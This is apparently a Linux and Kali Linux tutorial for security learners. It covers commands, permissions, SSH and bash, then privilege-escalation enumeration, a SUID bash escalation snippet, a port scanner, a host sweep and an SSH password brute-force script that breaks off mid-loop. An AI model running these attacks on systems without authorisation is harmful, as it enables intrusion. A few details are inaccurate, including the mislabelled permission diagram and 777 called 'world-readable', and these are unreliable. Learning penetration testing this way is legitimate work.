# 🐧 Linux & Kali Linux for Cybersecurity

> Linux is not just an operating system — it is the foundation of cybersecurity.<br>
> Every penetration tester, red teamer, and security engineer lives in the terminal.<br>
> Master Linux, master the attack surface.

---

## 📖 Table of Contents

1. [Linux Fundamentals](#1-linux-fundamentals)
2. [File System & Navigation](#2-file-system--navigation)
3. [File Permissions & Ownership](#3-file-permissions--ownership)
4. [User & Group Management](#4-user--group-management)
5. [Text Processing & Searching](#5-text-processing--searching)
6. [Process Management](#6-process-management)
7. [Networking Commands](#7-networking-commands)
8. [SSH & Remote Access](#8-ssh--remote-access)
9. [Package Management](#9-package-management)
10. [Bash Scripting Basics](#10-bash-scripting-basics)
11. [System Administration](#11-system-administration)
12. [Kali Linux Introduction](#12-kali-linux-introduction)
13. [Essential Kali Tools](#13-essential-kali-tools)
14. [Privilege Escalation Techniques](#14-privilege-escalation-techniques)
15. [Bash Scripting for Penetration Testing](#15-bash-scripting-for-penetration-testing)
16. [Log Analysis & Monitoring](#16-log-analysis--monitoring)
17. [Common Linux Vulnerabilities](#17-common-linux-vulnerabilities)
18. [Performance Tuning](#18-performance-tuning)

---

## 1. Linux Fundamentals

### What is Linux?

Linux is a **free, open-source operating system kernel** created by Linus Torvalds in 1991. It powers:
- Servers (most of the internet runs on Linux)
- Embedded systems (IoT devices, routers)
- Supercomputers
- Android phones
- Security tools (Kali Linux, Parrot OS)

As a cybersecurity professional, you MUST be comfortable with Linux because:
- Most servers you'll target run Linux
- Most pentesting tools run on Linux
- The command line is faster and more powerful than any GUI
- Linux is portable — same commands work everywhere

### Linux Distributions

A **Linux distribution** is the Linux kernel + GNU utilities + package manager + default software.

| Distro | Purpose | Use Case |
|--------|---------|----------|
| **Ubuntu** | Beginner-friendly, easy to use | Learning, desktops |
| **Debian** | Stable, community-driven | Servers, stability |
| **CentOS** | Enterprise, Red Hat-based | Enterprise servers |
| **Kali Linux** | Pentesting focused | Offensive security, hacking |
| **Parrot OS** | Privacy-focused, lightweight | Pentesting, privacy |
| **AlmaLinux** | RHEL alternative | Enterprise |

> **For cybersecurity:** Start with **Ubuntu** to learn basics, then move to **Kali Linux** for advanced pentesting tools.

### Linux Kernel vs Shell

| Component | What | Purpose |
|-----------|------|---------|
| **Kernel** | Core of Linux | Manages hardware, processes, memory |
| **Shell** | Command interpreter | Translates user commands to kernel |
| **Bash** | Bourne Again Shell | Most common shell (default on most Linux distros) |

---

## 2. File System & Navigation

### Linux File System Hierarchy

```
/
├── /bin/          → Essential executable programs (ls, cat, cp, mv)
├── /sbin/         → System binaries (only superuser can run)
├── /usr/          → User programs and data
├── /usr/bin/      → User application binaries
├── /usr/sbin/     → User system binaries
├── /usr/local/    → Locally installed software
├── /home/         → User home directories
├── /root/         → Root user home directory
├── /etc/          → System configuration files
├── /var/          → Variable data (logs, caches, temporary files)
├── /var/log/      → System logs (Apache, Nginx, Syslog)
├── /tmp/          → Temporary files (cleared on reboot)
├── /opt/          → Optional third-party software
├── /lib/          → System libraries
├── /boot/         → Bootloader and kernel files
├── /dev/          → Device files (hard drives, terminals)
├── /proc/         → Virtual filesystem for process info
├── /sys/          → Virtual filesystem for system info
├── /mnt/          → Mount point for external filesystems
└── /srv/          → Service data
```

### Essential Navigation Commands

| Command | Purpose | Example |
|---------|---------|---------|
| `pwd` | Print working directory | `pwd` → `/home/user/documents` |
| `cd` | Change directory | `cd /home/user` |
| `cd ~` | Go to home directory | Always works |
| `cd ..` | Go to parent directory | Move up one level |
| `cd -` | Go to previous directory | Toggle between directories |
| `ls` | List directory contents | `ls -la` (detailed, hidden files) |
| `ls -la` | List all files + hidden + details | Shows permissions, size, owner |
| `tree` | Display directory tree | `tree -L 2` (2 levels deep) |

### File Operations

| Command | Purpose | Example |
|---------|---------|---------|
| `touch` | Create empty file or update timestamp | `touch newfile.txt` |
| `cp` | Copy file or directory | `cp file.txt /path/` or `cp -r dir/ /path/` |
| `mv` | Move or rename file | `mv oldname.txt newname.txt` |
| `rm` | Remove file | `rm file.txt` |
| `rm -rf` | Remove directory recursively | ⚠️ Be careful — **PERMANENT DELETION** |
| `mkdir` | Create directory | `mkdir newfolder` |
| `mkdir -p` | Create nested directories | `mkdir -p path/to/nested/folder` |
| `rmdir` | Remove empty directory | `rmdir emptyfolder` |

### Viewing File Contents

| Command | Purpose | Use Case |
|---------|---------|----------|
| `cat` | Display entire file | `cat file.txt` |
| `less` | View file page by page | `less largefile.txt` (press q to quit) |
| `more` | Like `less` but older | `more file.txt` |
| `head` | Show first N lines | `head -20 file.txt` (first 20 lines) |
| `tail` | Show last N lines | `tail -50 file.txt` (last 50 lines) |
| `tail -f` | Follow file (live updates) | `tail -f /var/log/apache2/access.log` — watch logs in real-time |
| `wc` | Count lines, words, characters | `wc -l file.txt` (lines) |
| `file` | Identify file type | `file myfile` |

---

## 3. File Permissions & Ownership

### Understanding Permissions

In Linux, every file has three permission categories: **user (owner)**, **group**, and **others**.

Each category can have three types of permissions: **read (r)**, **write (w)**, **execute (x)**.

```
-rw-r--r-- 1 malik users 2048 Jun 5 14:30 script.sh

|   | |
|   +--- Other (5th-7th char): r-- = read only
+------- Group (3rd-4th char): r-- = read only
        Owner (1st-2nd char): rw- = read and write
```

### Permission Breakdown

| Character | Position | What it means |
|-----------|----------|--------------|
| `-` | 1st | Regular file (d = directory, l = link) |
| `rw-` | 2-4 | Owner permissions: read, write, no execute |
| `r--` | 5-7 | Group permissions: read only |
| `r--` | 8-10 | Others permissions: read only |

### Permission Values (Octal)

| Octal | Binary | Permissions | Meaning |
|-------|--------|-------------|---------|
| 7 | 111 | rwx | Read, write, execute |
| 6 | 110 | rw- | Read, write |
| 5 | 101 | r-x | Read, execute |
| 4 | 100 | r-- | Read only |
| 0 | 000 | --- | No permissions |

### Permission Commands

| Command | Purpose | Example |
|---------|---------|---------|
| `chmod` | Change file permissions | `chmod 755 script.sh` or `chmod u+x script.sh` |
| `chmod +x` | Make file executable | `chmod +x script.sh` |
| `chmod -x` | Remove execute permission | `chmod -x script.sh` |
| `chmod u+rwx` | Give owner all permissions | `chmod u+rwx file.txt` |
| `chmod g-w` | Remove group write permission | `chmod g-w file.txt` |
| `chmod o-r` | Remove others read permission | `chmod o-r sensitive.txt` |
| `chown` | Change owner | `chown newuser file.txt` |
| `chgrp` | Change group | `chgrp newgroup file.txt` |
| `chown user:group` | Change both | `chown malik:users file.txt` |

### Common Permissions in Penetration Testing

| Permission | Octal | Use | Security Implication |
|-----------|-------|-----|----------------------|
| rwx------ | 700 | Private script (owner only) | Highest security |
| rwxr-xr-x | 755 | Public executable script | Standard for scripts |
| rw-r--r-- | 644 | Public readable file | Standard for data files |
| rwxrwxrwx | 777 | World-readable (dangerous) | **Major vulnerability** |
| rw------- | 600 | Private key (owner only) | SSH keys should be 600 |

> **Pentesting tip:** During enumeration, always look for files with world-writable permissions (777). These are often misconfigurations that enable privilege escalation.

---

## 4. User & Group Management

### Understanding Users and Groups

Linux is a **multi-user system**. Multiple users can work on the same machine simultaneously, each with their own files and permissions.

| Entity | Purpose |
|--------|---------|
| **User** | Individual account with unique UID (User ID) |
| **Group** | Collection of users (GID - Group ID) |
| **Root** | Superuser (UID 0) — has all permissions |
| **Sudo** | Execute command with elevated privileges |

### Important Files

| File | Purpose |
|------|---------|
| `/etc/passwd` | User account information (readable by all) |
| `/etc/shadow` | Encrypted password hashes (readable only by root) |
| `/etc/group` | Group definitions |
| `/etc/sudoers` | Sudo configuration — who can use sudo |

### User Commands

| Command | Purpose | Example |
|---------|---------|---------|
| `whoami` | Current logged-in user | `whoami` → `malik` |
| `id` | User and group info | `id` → uid=1000(malik) gid=1000(malik) groups=1000(malik),4(adm) |
| `sudo` | Execute as superuser | `sudo apt update` |
| `sudo -i` | Open root shell | `sudo -i` → becomes root (`#` prompt) |
| `su` | Switch user | `su - malik` (switch to malik, requires password) |
| `passwd` | Change password | `passwd` (change own) or `sudo passwd username` (admin) |

### User Management (Admin Commands)

| Command | Purpose | Example |
|---------|---------|---------|
| `useradd` | Create new user | `sudo useradd malik` |
| `userdel` | Delete user | `sudo userdel malik` |
| `groupadd` | Create new group | `sudo groupadd developers` |
| `usermod` | Modify user properties | `sudo usermod -aG sudo malik` (add to sudo group) |
| `usermod -aG group user` | Add user to group | `sudo usermod -aG docker malik` |

### Sudo Configuration

To allow a user to run specific commands without a password:

```bash
# Edit sudoers file (ALWAYS use visudo, not nano)
sudo visudo

# Add this line:
malik ALL=(ALL) NOPASSWD: /usr/bin/shutdown

# Now malik can run: sudo shutdown without entering password
```

> **⚠️ IMPORTANT:** Always use `sudo visudo` to edit `/etc/sudoers`. Direct editing can break sudo access and lock you out of root commands.

---

## 5. Text Processing & Searching

### Searching for Files

| Command | Purpose | Example |
|---------|---------|---------|
| `find` | Search for files | `find / -name "*.txt"` (all .txt files) |
| `find -type f` | Find regular files | `find /home -type f -name "*.log"` |
| `find -type d` | Find directories | `find / -type d -name "config"` |
| `locate` | Fast search (uses database) | `locate passwd` |
| `which` | Find command location | `which python3` → `/usr/bin/python3` |
| `whereis` | Find command and man pages | `whereis gcc` |

### Searching Inside Files

| Command | Purpose | Example |
|---------|---------|---------|
| `grep` | Search for pattern in file | `grep "error" logfile.txt` |
| `grep -i` | Case-insensitive search | `grep -i "ERROR" logfile.txt` |
| `grep -r` | Recursive search in directory | `grep -r "password" /etc/` |
| `grep -l` | Show only filenames | `grep -r -l "admin" /var/` |
| `grep -c` | Count matches | `grep -c "error" logfile.txt` |
| `grep -n` | Show line numbers | `grep -n "TODO" script.py` |
| `grep "^pattern"` | Match at start of line | `grep "^#" config.txt` (all comments) |
| `grep "pattern$"` | Match at end of line | `grep "\.log$" /var/log/` |
| `grep -E` | Extended regex | `grep -E "[0-9]{1,3}\.[0-9]{1,3}"` (IP patterns) |

### Text Processing & Manipulation

| Command | Purpose | Example |
|---------|---------|---------|
| `sed` | Stream editor (find & replace) | `sed 's/old/new/g' file.txt` |
| `awk` | Text processor | `awk '{print $1}' file.txt` (print first column) |
| `cut` | Extract columns | `cut -d: -f1 /etc/passwd` (print usernames) |
| `sort` | Sort lines | `sort -n numbers.txt` (numeric sort) |
| `sort -r` | Reverse sort | `sort -r file.txt` |
| `sort -u` | Sort and remove duplicates | `sort -u emails.txt` |
| `uniq` | Remove duplicate consecutive lines | `sort file.txt \| uniq` |
| `uniq -c` | Count occurrences | `sort file.txt \| uniq -c` |
| `tr` | Translate characters | `tr 'a-z' 'A-Z' < file.txt` (lowercase to uppercase) |

### Practical Examples for Pentesting

```bash
# Find all files containing "password"
grep -r "password" /home --include="*.txt"

# Extract usernames from /etc/passwd
cut -d: -f1 /etc/passwd

# Count failed SSH login attempts
grep "Failed password" /var/log/auth.log | wc -l

# Find recently modified files in the last 24 hours
find / -type f -mtime -1

# Extract IP addresses from a log file
grep -oE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" logfile.txt | sort -u

# Find all Python files and check for hardcoded passwords
grep -r "password\|pwd\|secret" /path/to/code --include="*.py"
```

---

## 6. Process Management

### Understanding Processes

Every running program is a **process**. Each process has a unique **PID (Process ID)** and can consume CPU, memory, and other resources.

### Process Information Commands

| Command | Purpose | Example |
|---------|---------|---------|
| `ps` | List processes | `ps aux` (all processes, detailed) |
| `ps aux` | All processes + details | Shows USER, PID, CPU%, MEM%, COMMAND |
| `ps aux \| grep name` | Find specific process | `ps aux \| grep nginx` |
| `top` | Live process monitor | Real-time CPU/memory usage |
| `htop` | Enhanced top (if installed) | `htop` (interactive, prettier) |
| `pgrep` | Find PID by name | `pgrep firefox` → returns PID |
| `pidof` | Get PID of program | `pidof apache2` |
| `lsof` | List open files by process | `lsof -p 1234` (files opened by PID 1234) |

### Process Control

| Command | Purpose | Example |
|---------|---------|---------|
| `kill PID` | Terminate process | `kill 1234` (graceful shutdown) |
| `kill -9 PID` | Force kill process | `kill -9 1234` (SIGKILL — immediate) |
| `killall` | Kill all processes by name | `killall firefox` |
| `nice` | Run process with priority | `nice -n 19 long_running_task.sh` (lowest priority) |
| `renice` | Change priority of running process | `renice -n 10 -p 1234` |
| `&` | Run in background | `./long_process.sh &` |
| `Ctrl+Z` | Pause foreground process | Pauses but doesn't kill |
| `bg` | Resume paused process in background | `bg` |
| `fg` | Bring background process to foreground | `fg %1` |
| `jobs` | List background jobs | `jobs` |
| `nohup` | Run process immune to hangups | `nohup ./script.sh > output.log &` |

### Service Management (systemd)

Modern Linux uses **systemd** to manage services.

| Command | Purpose | Example |
|---------|---------|---------|
| `systemctl status` | Check service status | `sudo systemctl status apache2` |
| `systemctl start` | Start service | `sudo systemctl start nginx` |
| `systemctl stop` | Stop service | `sudo systemctl stop nginx` |
| `systemctl restart` | Restart service | `sudo systemctl restart apache2` |
| `systemctl enable` | Enable at boot | `sudo systemctl enable ssh` |
| `systemctl disable` | Disable at boot | `sudo systemctl disable ssh` |
| `systemctl list-units --type=service` | Show all services | List all available services |

### Pentesting Process Commands

```bash
# Find all listening ports and which process uses them
sudo netstat -tulpn | grep LISTEN

# or (modern alternative)
sudo ss -tulpn | grep LISTEN

# Find which user is running a process
ps aux | grep nginx

# Check resource usage of specific process
top -p $(pgrep firefox)

# Monitor system calls of a process (detect suspicious activity)
strace -p 1234

# Monitor network activity of a process
tcpdump -p -i eth0 -w dump.pcap

# Check what files a process has open
lsof -p $(pgrep apache2)
```

---

## 7. Networking Commands

### Basic Network Information

| Command | Purpose | Example |
|---------|---------|---------|
| `ifconfig` | Show network interfaces (deprecated) | `ifconfig` → shows IP, MAC, etc. |
| `ip addr show` | Modern replacement for ifconfig | `ip addr show` |
| `ip link show` | Show network interfaces with status | `ip link show` |
| `hostname` | Show system hostname | `hostname` |
| `hostname -I` | Show IP addresses | `hostname -I` |
| `ip route` | Show routing table | `ip route` |
| `route -n` | Show routes (numeric format) | `route -n` |

### Connectivity Testing

| Command | Purpose | Example |
|---------|---------|---------|
| `ping` | Test connectivity (ICMP) | `ping -c 4 8.8.8.8` (4 packets) |
| `traceroute` | Show path to destination | `traceroute google.com` |
| `tracert` | Windows version of traceroute | `tracert google.com` |
| `netstat` | Show network statistics | `netstat -tulpn` (listening ports + processes) |
| `ss` | Modern replacement for netstat | `ss -tulpn` (same as netstat) |
| `nslookup` | DNS query | `nslookup google.com` |
| `dig` | Advanced DNS query | `dig @8.8.8.8 google.com` (query specific nameserver) |
| `host` | DNS lookup | `host google.com` |

### Common Netstat/SS Output

```
Proto | Recv-Q | Send-Q | Local Address | Foreign Address | State
tcp   | 0      | 0      | 0.0.0.0:22    | 0.0.0.0:*       | LISTEN
tcp   | 0      | 0      | 127.0.0.1:631 | 0.0.0.0:*       | LISTEN
```

| State | Meaning |
|-------|---------|
| LISTEN | Waiting for incoming connections |
| ESTABLISHED | Active connection |
| TIME_WAIT | Waiting before closing |
| CLOSE_WAIT | Waiting for process to close |

### ARP Commands

| Command | Purpose | Example |
|---------|---------|---------|
| `arp -a` | Show ARP cache | `arp -a` → maps IPs to MAC addresses |
| `arp -d` | Delete ARP entry | `sudo arp -d 192.168.1.1` |
| `arp -s` | Add static ARP entry | `sudo arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF` |
| `ip neigh show` | Modern replacement for arp | `ip neigh show` |

### Practical Pentesting Network Commands

```bash
# Find all active hosts on your subnet
nmap -sn 192.168.1.0/24

# Find all listening services and their processes
sudo ss -tulpn | grep LISTEN

# Monitor live network traffic (basic)
sudo tcpdump -i eth0 -n

# Capture HTTP traffic only
sudo tcpdump -i eth0 -n 'tcp port 80'

# Check DNS queries in real-time
sudo tcpdump -i eth0 -n 'udp port 53'

# Show all established connections
netstat -tupn | grep ESTABLISHED

# Test if a port is open
nc -zv 192.168.1.1 22

# Scan for open ports on a target
nmap -p 1-65535 192.168.1.1
```

---

## 8. SSH & Remote Access

### SSH (Secure Shell)

SSH is the **standard secure protocol** for remote login and command execution. Every pentester and sysadmin uses SSH daily.

### SSH Connection

| Command | Purpose | Example |
|---------|---------|---------|
| `ssh user@host` | Connect to remote server | `ssh malik@192.168.1.100` |
| `ssh -p PORT user@host` | SSH on non-standard port | `ssh -p 2222 malik@example.com` |
| `ssh -v user@host` | Verbose output (debugging) | Shows connection details |
| `ssh -l username host` | Specify username | `ssh -l malik example.com` |

### SSH Key-Based Authentication

**Much more secure than passwords.**

```bash
# Generate SSH key pair (on your local machine)
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N ""

# Copy public key to remote server
ssh-copy-id -i ~/.ssh/id_rsa.pub malik@192.168.1.100

# Or manually:
cat ~/.ssh/id_rsa.pub | ssh malik@192.168.1.100 "cat >> ~/.ssh/authorized_keys"

# Now login without password
ssh malik@192.168.1.100
```

### SSH Configuration

Edit `~/.ssh/config` for easier connections:

```
Host myserver
    HostName 192.168.1.100
    User malik
    Port 22
    IdentityFile ~/.ssh/id_rsa
```

Now you can just run: `ssh myserver`

### SSH File Transfer

| Command | Purpose | Example |
|---------|---------|---------|
| `scp` | Secure copy (SSH-based) | `scp file.txt malik@host:/home/malik/` |
| `scp -r` | Copy directory recursively | `scp -r folder/ malik@host:/destination/` |
| `scp host:file local/` | Download from remote | `scp malik@host:/var/log/apache.log .` |
| `sftp` | SSH file transfer protocol | `sftp malik@host` (interactive shell) |

### SSH Tunneling (Port Forwarding)

Forward local port to remote service through SSH tunnel:

```bash
# Local port forwarding: forward local port 8080 to remote port 3306
ssh -L 8080:localhost:3306 malik@host

# Now connect to localhost:8080 to reach the remote MySQL on port 3306
mysql -h localhost -P 8080 -u root
```

### SSH Security Best Practices

| Practice | Why |
|----------|-----|
| Disable password auth | Use only key-based authentication |
| Change default SSH port | Avoid automated scanners (port 22) |
| Disable root login | Prevent direct root access |
| Use strong passphrases | Protect your private keys |
| Use SSH keys with 4096-bit RSA minimum | Better cryptography |
| Regularly rotate keys | Limit damage if key is compromised |

### SSH Configuration on Server (`/etc/ssh/sshd_config`)

```bash
# Disable password authentication
PasswordAuthentication no

# Disable root login
PermitRootLogin no

# Change port
Port 2222

# Allow key-based auth
PubkeyAuthentication yes
```

After editing, restart SSH:
```bash
sudo systemctl restart ssh
```

---

## 9. Package Management

### Linux Package Managers

Different Linux distributions use different package managers:

| Distro | Manager | Command |
|--------|---------|---------|
| Ubuntu, Debian | apt | `apt install package` |
| Red Hat, CentOS | yum / dnf | `yum install package` |
| Arch | pacman | `pacman -S package` |
| macOS | brew | `brew install package` |

### APT (Ubuntu/Debian)

| Command | Purpose | Example |
|---------|---------|---------|
| `apt update` | Update package list | `sudo apt update` |
| `apt upgrade` | Upgrade all packages | `sudo apt upgrade` |
| `apt install` | Install package | `sudo apt install nginx` |
| `apt remove` | Remove package (keep config) | `sudo apt remove nginx` |
| `apt purge` | Remove package (delete config) | `sudo apt purge nginx` |
| `apt search` | Search for package | `apt search python` |
| `apt show` | Show package info | `apt show nginx` |
| `apt list --upgradable` | List packages with updates available | Show pending upgrades |
| `apt autoremove` | Remove unused dependencies | `sudo apt autoremove` |

### Installing from Source

Sometimes you need to compile software from source:

```bash
# Download source code
wget https://example.com/package-1.0.tar.gz

# Extract
tar -xzf package-1.0.tar.gz
cd package-1.0/

# Install dependencies (read README first)
sudo apt install build-essential libssl-dev

# Compile and install
./configure
make
sudo make install

# Verify installation
which package
```

### Snap & Flatpak (Alternative Package Systems)

Modern package systems for containerized apps:

```bash
# Snap
sudo snap install vlc

# Flatpak
flatpak install flatseal
```

### Pip (Python Package Manager)

For Python packages:

```bash
# Install package
pip3 install requests

# List installed packages
pip3 list

# Install from requirements file
pip3 install -r requirements.txt

# Upgrade package
pip3 install --upgrade requests
```

---

## 10. Bash Scripting Basics

### Why Bash Scripting?

Bash scripts automate repetitive tasks and are essential for:
- System administration
- Penetration testing automation
- Log analysis
- Batch processing

### Basic Script Structure

```bash
#!/bin/bash
# This is a comment

# Variables
NAME="Malik"
AGE=25

# Echo (print)
echo "Hello, $NAME"
echo "You are $AGE years old"

# Input
read -p "Enter your name: " USER_INPUT
echo "You entered: $USER_INPUT"
```

### Variables

```bash
# Assign variable
VARIABLE="value"
variable=123

# Use variable
echo $VARIABLE

# Command substitution
CURRENT_DATE=$(date)
echo "Today is $CURRENT_DATE"

# Arithmetic
COUNT=5
COUNT=$((COUNT + 1))
echo $COUNT  # 6
```

### Conditionals

```bash
# If statement
if [ $AGE -ge 18 ]; then
    echo "Adult"
else
    echo "Minor"
fi

# Comparison operators
# -eq (equal), -ne (not equal)
# -lt (less than), -gt (greater than)
# -le (less than or equal), -ge (greater than or equal)

# String comparison
if [ "$NAME" = "Malik" ]; then
    echo "Match"
fi

# File checks
if [ -f /etc/passwd ]; then
    echo "File exists"
fi
# -f (file exists), -d (directory exists), -r (readable), -w (writable), -x (executable)
```

### Loops

```bash
# For loop
for i in 1 2 3 4 5; do
    echo "Number: $i"
done

# While loop
COUNT=1
while [ $COUNT -le 5 ]; do
    echo "Count: $COUNT"
    COUNT=$((COUNT + 1))
done

# Loop through files
for file in *.txt; do
    echo "Processing $file"
done
```

### Functions

```bash
# Define function
greet() {
    echo "Hello, $1"
}

# Call function with argument
greet "Malik"

# Function with return
add() {
    echo $(($1 + $2))
}

RESULT=$(add 5 3)
echo "Result: $RESULT"  # Result: 8
```

### Command Line Arguments

```bash
#!/bin/bash

# $0 = script name
# $1 = first argument
# $2 = second argument
# $* = all arguments

echo "Script: $0"
echo "Argument 1: $1"
echo "Argument 2: $2"
echo "Total arguments: $#"

# Check if argument exists
if [ -z "$1" ]; then
    echo "Please provide an argument"
    exit 1
fi
```

### Error Handling

```bash
#!/bin/bash

# Exit on error
set -e

# Command that might fail
grep "pattern" file.txt || { echo "Pattern not found"; exit 1; }

# Check exit code
if [ $? -eq 0 ]; then
    echo "Success"
else
    echo "Failed"
fi
```

---

## 11. System Administration

### System Information

| Command | Purpose | Example |
|---------|---------|---------|
| `uname -a` | Kernel and system info | Shows OS name, version, architecture |
| `lsb_release -a` | Linux distribution info | Ubuntu 22.04 LTS details |
| `uptime` | System uptime and load | `uptime` → Shows how long system is running |
| `df -h` | Disk space usage | `-h` for human-readable format |
| `du -sh` | Directory size | `du -sh /home` → total size of /home |
| `free -h` | Memory usage | Shows RAM and swap usage |
| `vmstat` | Virtual memory statistics | Detailed memory and CPU info |

### Disk Management

| Command | Purpose | Example |
|---------|---------|---------|
| `fdisk -l` | List disks and partitions | `sudo fdisk -l` |
| `lsblk` | Block devices tree | Visual representation of disks |
| `parted` | Partition editor | `sudo parted /dev/sda` (interactive) |
| `mount` | Mount filesystem | `sudo mount /dev/sdb1 /mnt/external` |
| `umount` | Unmount filesystem | `sudo umount /mnt/external` |
| `mkfs` | Create filesystem | `sudo mkfs.ext4 /dev/sdb1` |

### System Logs

| File | Purpose |
|------|---------|
| `/var/log/syslog` | General system log |
| `/var/log/auth.log` | Authentication events (logins, sudo) |
| `/var/log/apache2/access.log` | Apache web server requests |
| `/var/log/nginx/access.log` | Nginx web server requests |
| `/var/log/kern.log` | Kernel messages |
| `/var/log/cron.log` | Cron job logs |

```bash
# View recent log entries
tail -f /var/log/auth.log

# Search log for specific event
grep "Failed password" /var/log/auth.log

# Count failed login attempts
grep "Failed password" /var/log/auth.log | wc -l

# Check sudo usage
sudo grep "sudo:" /var/log/auth.log | tail -20
```

### Cron Jobs (Scheduled Tasks)

Schedule scripts to run automatically:

```bash
# Edit crontab
crontab -e

# Example cron entries:
# Run daily at 2 AM
0 2 * * * /home/malik/backup.sh

# Run every hour
0 * * * * /usr/local/bin/hourly_task.sh

# Run every 5 minutes
*/5 * * * * /home/malik/monitor.sh

# View crontab
crontab -l

# View system crontabs
cat /etc/crontab
```

Crontab format:
```
Minute | Hour | Day | Month | Weekday | Command
  0-59 | 0-23 | 1-31 | 1-12  | 0-7(0=Sun) |
```

---

## 12. Kali Linux Introduction

### What is Kali Linux?

**Kali Linux** is a Debian-based Linux distribution **specifically designed for penetration testing and ethical hacking**. It comes pre-installed with hundreds of security tools.

### Key Differences from Ubuntu

| Aspect | Ubuntu | Kali |
|--------|--------|------|
| Purpose | General-purpose desktop/server | Penetration testing |
| Pre-installed Tools | Minimal (office, browser) | 600+ security tools |
| Default User | Named user (sudo access) | root user |
| Package Selection | General packages | Security-focused packages |
| Use Case | Productivity, servers | Penetration testing, ethical hacking |

### Installing Kali Linux

**Option 1: Virtual Machine (Recommended for Learning)**
1. Download VirtualBox or VMware
2. Download Kali Linux ISO
3. Create new VM with 2+ cores, 4GB+ RAM, 20GB+ disk
4. Boot from ISO and follow installation

**Option 2: Dual Boot**
1. Create USB boot drive
2. Reboot, select USB
3. Follow installer (be careful with disk selection!)

**Option 3: Live Boot**
- Boot directly from USB without installation (useful for testing)

### First Steps on Kali

```bash
# Update package list and upgrade
sudo apt update && sudo apt upgrade -y

# Install additional tools as needed
sudo apt install -y nmap wireshark metasploit-framework

# Check network connectivity
ip addr show
ping -c 1 8.8.8.8

# Verify tools
nmap --version
msfconsole --version
```

---

## 13. Essential Kali Tools

### Network Reconnaissance

| Tool | Purpose |
|------|---------|
| **Nmap** | Network mapping and vulnerability scanning |
| **Netdiscover** | ARP-based network discovery |
| **Wireshark** | Packet capture and analysis |
| **Tcpdump** | Command-line packet capture |
| **Masscan** | Fast port scanning |
| **Zenmap** | GUI for Nmap |

### Web Application Testing

| Tool | Purpose |
|------|---------|
| **Burp Suite Community** | Web proxy, scanner, fuzzer for web apps |
| **OWASP ZAP** | Web scanner (open-source alternative to Burp) |
| **Nikto** | Web server scanner |
| **Dirb** | Directory brute-forcing |
| **Gobuster** | Fast directory and DNS enumeration |
| **sqlmap** | Automatic SQL injection detection |

### Exploitation & Post-Exploitation

| Tool | Purpose |
|------|---------|
| **Metasploit Framework** | Exploitation platform with hundreds of payloads |
| **Searchsploit** | Search for known exploits |
| **Hashcat** | GPU-accelerated password cracking |
| **John the Ripper** | Password cracking tool |
| **Hydra** | Credential brute-forcing (SSH, FTP, etc.) |

### Privilege Escalation

| Tool | Purpose |
|------|---------|
| **GTFOBins** | Sudo privilege escalation techniques database |
| **Linpeas** | Linux privilege escalation checker |
| **Winpeas** | Windows privilege escalation checker |
| **BeRoot** | Windows privilege escalation checker |

### Wireless Security

| Tool | Purpose |
|------|---------|
| **Aircrack-ng** | Wireless password cracking |
| **Airmon-ng** | Wireless monitor mode |
| **Kismet** | Wireless network detector |
| **Reaver** | WPS brute-forcing |

### Information Gathering

| Tool | Purpose |
|------|---------|
| **Whois** | Domain registration info |
| **Dmitry** | Deep information reconnaissance |
| **Maltego** | OSINT framework |
| **Shodan** | Internet scanner (cloud-based) |
| **theHarvester** | Email and subdomain harvester |

---

## 14. Privilege Escalation Techniques

### What is Privilege Escalation?

**Privilege escalation** = gaining higher privileges (often root/administrator) from a lower privilege account.

### Methods

| Method | Description | Example |
|--------|-------------|---------|
| **Sudo Misconfiguration** | User can run certain commands as root | `sudo -l` reveals what you can run |
| **SUID Binaries** | Executables with setuid bit run as owner | `find / -perm -4000` |
| **Kernel Vulnerabilities** | Unpatched kernel exploits | Use exploit-db to find CVEs |
| **Weak File Permissions** | World-writable sensitive files | `chmod 777 /etc/passwd` |
| **Cron Jobs** | Scheduled scripts with weak permissions | Edit cron script if owner is root |
| **Environment Variables** | PATH manipulation or LD_PRELOAD | Hijack library loading |
| **Sudo Bypass** | Exploitable sudo configurations | `sudo -u root` without password |

### Detecting Privilege Escalation Opportunities

```bash
# What can I run with sudo?
sudo -l

# Find SUID binaries (dangerous if exploitable)
find / -perm -4000 2>/dev/null

# Find world-writable files
find / -perm -222 2>/dev/null

# Check for weak file permissions on sensitive files
ls -la /etc/passwd /etc/shadow /root

# Check for scheduled cron jobs
cat /var/spool/cron/crontabs/*

# Check environment variables
env
echo $PATH
```

### Common SUID Exploits

```bash
# Dangerous SUID binaries (common targets)
/usr/bin/sudo
/bin/su
/usr/bin/passwd
/bin/mount
/bin/umount
/usr/bin/vim
/bin/bash (if SUID)

# Example: bash SUID exploitation
if [ -u /bin/bash ]; then
    /bin/bash -p  # -p maintains setuid privileges
fi
```

---

## 15. Bash Scripting for Penetration Testing

### Port Scanner Script

```bash
#!/bin/bash

# Simple port scanner
# Usage: ./port_scan.sh 192.168.1.1

TARGET=$1
PORTS="22 80 443 3306 5432 8080"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

echo "[*] Scanning $TARGET"
echo "[*] Checking ports: $PORTS"

for PORT in $PORTS; do
    timeout 1 bash -c "</dev/tcp/$TARGET/$PORT" 2>/dev/null && \
        echo "[+] Port $PORT: OPEN" || \
        echo "[-] Port $PORT: CLOSED"
done
```

### Host Discovery Script

```bash
#!/bin/bash

# Find alive hosts on subnet
# Usage: ./host_discovery.sh 192.168.1

SUBNET=$1

if [ -z "$SUBNET" ]; then
    echo "Usage: $0 <subnet_range> (e.g., 192.168.1)"
    exit 1
fi

echo "[*] Scanning $SUBNET.0/24"

for i in {1..254}; do
    ping -c 1 -W 1 $SUBNET.$i > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "[+] $SUBNET.$i is alive"
    fi
done
```

### Password Cracking Script

```bash
#!/bin/bash

# Brute force SSH login
# Usage: ./ssh_brute.sh target_ip username password_list.txt

TARGET=$1
USER=$2
WORDLIST=$3

if [ -z "$TARGET" ] || [ -z "$USER" ] || [ -z "$WORDLIST" ]; then
    echo "Usage: $0 <target> <username> <wordlist>"
    exit 1
fi

while IFS= read -r PASSWORD; do
    echo "[*] Trying $USER:$PASSWORD"
    sshpass -p "$PASSWORD" ssh -o ConnectTimeout=2 $USER@$TARGET exit 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] SUCCESS: $USER:$PASSWORD"
        exit 0
    fi
